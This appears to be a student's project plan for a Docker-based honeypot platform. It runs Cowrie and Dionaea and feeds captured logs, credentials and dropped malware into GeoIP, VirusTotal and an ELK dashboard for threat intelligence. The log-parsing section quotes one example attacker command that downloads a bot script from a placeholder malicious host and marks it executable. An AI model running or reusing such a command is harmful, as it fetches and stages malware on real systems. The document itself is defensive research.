# 🎯 030 - Honeypot Deployment & Attack Analysis Platform

> **Category**: [[Network Penetration Testing]] | **Difficulty**: ⭐⭐ | **Duration**: 5 weeks

---

## so what's the deal with this?

> [!CAUTION] it gets real out there
> honestly, the internet is basically a warzone. global botnets, zero-day scanners, and threat actors are constantly knocking on doors. defense teams usually don't get the early-stage intel—like the exact creds being brute-forced, the shell commands they try to run, zero-day payloads, or where the IPs actually originate—until it's way too late and prod systems are already hit.

so, enter honeypots. they're basically decoy systems we leave exposed to the internet just to bait attackers. i'm setting up low-interaction and high-interaction honeypots that fake common enterprise protocols (SSH, Telnet, HTTP, SMB, FTP). this way, we can grab real-time threat intel without risking any actual assets.

we're building an automated honeynet platform here (Honeynet-Intel). i'm using docker to spin up a distributed setup with cowrie (for fake SSH/Telnet) and dionaea (to trap malware). all the logs get dumped into a python engine i'm writing that rips out attacker IPs, geo-location, dropped binaries, and brute-forced creds. then it all gets shoved into an ELK stack (elasticsearch, logstash, kibana) so i get a sick real-time threat dashboard.

### wild stuff that actually happened
- **mirai botnet (2016-present)**: IoT botnets are still out here scanning the whole IPv4 space for default SSH/Telnet creds. they infect unpatched routers and cameras literally seconds after they come online.
- **log4shell (2021)**: security nerds found out about internet-wide exploitation attempts of log4j within hours because of global HTTP honeypots.
- **ransomware pre-scanning (2023)**: bots testing default passwords on exposed RDP/SMB before manual ransomware deployment.

---

## some brainy papers i read

| # | Paper Title | Authors | Year | Source | Key Contribution |
|---|-------------|---------|------|--------|-----------------|
| 1 | Honeypots for Cybersecurity Threat Intelligence | Bringer et al. | 2017 | IEEE Security & Privacy | Formulated frameworks for collecting, scoring, and operationalizing honeypot threat intelligence logs. |
| 2 | Cowrie: SSH/Telnet Interaction Honeypot | Oosterhof, M. | 2019 | Open Source Report | Documented interaction emulation techniques for capturing attacker shell commands and session tty recordings. |
| 3 | Automated Malware Capture and Analysis via Dionaea | Realini et al. | 2015 | ACM Cyber Intelligence | Evaluated low-interaction SMB/FTP honeypots for automatic malware payload trapping. |

---

## how everything talks to each other
Link: [[Drawing 2026-07-30 22.31.19.excalidraw#Project 030: 030 - Honeypot Deployment & Attack Analysis Platform|Excalidraw Architecture Diagram]]

```mermaid
graph TD
    subgraph Internet_Threats ["1. Internet Attackers & Botnets"]
        Attacker1[Global Automated Botnet] -. Automated SSH Brute Force .-> Gateway[Edge Gateway Router / Firewall]
        Attacker2[Malware Delivery Script] -. SMB Exploit Attempt .-> Gateway
    end

    subgraph Honeynet_Decoys ["2. Containerized Honeypot Layer (Docker)"]
        Gateway -- Port 22/23 Redirect --> Decoy1[Cowrie SSH/Telnet Emulated Shell]
        Gateway -- Port 445/21 Redirect --> Decoy2[Dionaea SMB/FTP Malware Trap]
    end

    subgraph Analytics_Pipeline ["3. Threat Intelligence Processing Engine"]
        Decoy1 -- Raw JSON Logs & TTY Recordings --> Parser[Python Ingestion Engine]
        Decoy2 -- Captured Binary Payloads --> Parser
        
        Parser --> GeoIP[MaxMind GeoIP & ASN Extractor]
        Parser --> VirusTotal[VirusTotal Malware Hash Scanner]
        Parser --> CredentialMiner[Brute-Force Credential Frequency Miner]
    end

    subgraph Visualization_SIEM ["4. SIEM & Threat Intel Dashboard"]
        GeoIP --> Elastic[Elasticsearch Database Engine]
        VirusTotal --> Elastic
        CredentialMiner --> Elastic
        Elastic --> Kibana[Interactive Kibana Threat Map & Dashboard]
        Elastic --> SIEMAlert[Automated IP Blocklist Exporter]
    end

    style Internet_Threats fill:#1e1e2e,stroke:#f38ba8,stroke-width:2px;
    style Honeynet_Decoys fill:#181825,stroke:#89b4fa,stroke-width:2px;
    style Analytics_Pipeline fill:#11111b,stroke:#fab387,stroke-width:2px;
    style Visualization_SIEM fill:#313244,stroke:#a6e3a1,stroke-width:2px;
```

---

## how i'm building it

### week 1: getting the environment ready
- renting a cheap cloud VPS (digitalocean or AWS EC2) and throwing it straight to the public internet.
- installing docker, docker compose, python 3.11, and the elastic stack (elasticsearch & kibana).
- locking down firewall rules because i really don't want these honeypot containers breaking out into the host OS.

### weeks 2-3: spinning up the decoys
- **the docker setup (`docker-compose.yml`)**:
  - dropping a **cowrie** container listening on ports 22 (SSH) and 23 (Telnet).
  - dropping a **dionaea** container on ports 21 (FTP), 135 (RPC), and 445 (SMB).
- **log ingestion magic (`intel_processor.py`)**:
  - writing a script to parse live cowrie JSON logs (`cowrie.json`) so i can rip out:
    - the attacker IP, timestamp, and target port.
    - whatever username/password combos they try.
    - full terminal commands (like `wget http://malicious-ip/bot.sh; chmod +x bot.sh` - this part is wild).
  - hooking up the **MaxMind GeoIP2** database to tag IPs with their country and ISP/ASN.

### week 4: dashboarding the chaos
- **malware analysis engine (`malware_scanner.py`)**:
  - hashing dropped binaries (SHA-256) from the cowrie/dionaea download folders.
  - hitting the VirusTotal API to see if we caught anything famous (mirai, gafgyt, kinsing).
- **kibana configs**:
  - setting up `Filebeat` to ship logs to elasticsearch automatically.
  - building some custom kibana dashboards so i can sit back and watch:
    1. live global attack heatmaps.
    2. top 20 brute-forced passwords (always admin/admin lol).
    3. most frequent shell commands.
    4. which malware families are hitting me.

### week 5: wrapping it up
- letting it run for 7 days live on the internet to see what i catch.
- exporting dynamic threat intel blocklists straight to `iptables` format.
- writing up the final btech dissertation report and making slides.

---

## my toolkit

| Tool | Purpose | Alternative |
|------|---------|-------------|
| Cowrie | Medium-interaction SSH/Telnet honeypot to log shell commands | SSHD Fake |
| Dionaea | Low-interaction trap to catch malware over SMB/FTP | Conpot |
| Elasticsearch & Kibana | Logging, indexing, and sick visualization dashboards | Grafana + Loki |
| Docker / Docker Compose | Isolating everything so i don't get owned | Vagrant |
| MaxMind GeoIP2 / VirusTotal API | Finding out where attackers are and checking hashes | IPInfo API |

---

## the cool parts of this build
- ✅ **fake all the things**: emulating SSH, Telnet, SMB, FTP, and RPC to catch as much spam traffic as possible.
- ✅ **terminal recording**: logging every single keystroke attackers type when they get into cowrie's fake shell.
- ✅ **auto-malware extraction**: grabbing dropped binaries and throwing them at VirusTotal immediately.
- ✅ **geoip tracking**: appending country codes, cities, and ASN data to every single attack.
- ✅ **live SIEM dashboard**: kibana heatmaps, password frequency charts, and auto-generating IP blocklists.

---

## what i'm actually getting out of this

> [!NOTE] what i'm dropping at the end
> the full dockerized repo, the python pipeline, a massive dataset of real internet attack logs, and a final threat intel report.

### how fast it goes
- **processing time**: < 50ms from honeypot event to elasticsearch index.
- **geoip lookups**: > 500 queries per sec using local databases.
- **stealth**: making sure 100% of botnets think cowrie is a legit linux box.

### the final artifacts
1. honeynet deployment config (`docker-compose.yml`).
2. python pipeline script (`honeynet_intel_miner.py`).
3. the big report (`live_attack_analysis.pdf`).

---

## what i'm hoping to learn
1. 📚 **honeypots & decoys**: wrapping my head around low vs high interaction honeypots and how to fake services.
2. 📚 **threat intel (CTI)**: actually getting hands-on with collecting, cleaning, and using raw attack data.
3. 📚 **SIEM & logs**: getting decent at the elastic stack so i can visualize security data.
4. 📚 **malware forensics**: analyzing botnet scripts, shell payloads, and file hashes.

---

## warning label
> [!WARNING] don't be stupid
> exposing honeypots to the public internet means you are literally inviting attackers and malware into your setup. these containers MUST be completely isolated from your host OS and any internal networks. if they break out of the container (container escape), they're going to use your infrastructure to attack other people, which is bad news.

---

## other cool stuff i've worked on
- [[016 - Automated Network Reconnaissance Framework]]
- [[018 - DNS Tunneling Detection Using ML Classifiers]]
- [[021 - Network Traffic Anomaly Detection using Autoencoders]]

---
*📅 Created: 2026-07-30 | 🏷️ Category: Network Penetration Testing | 🔐 Offensive Security Research*
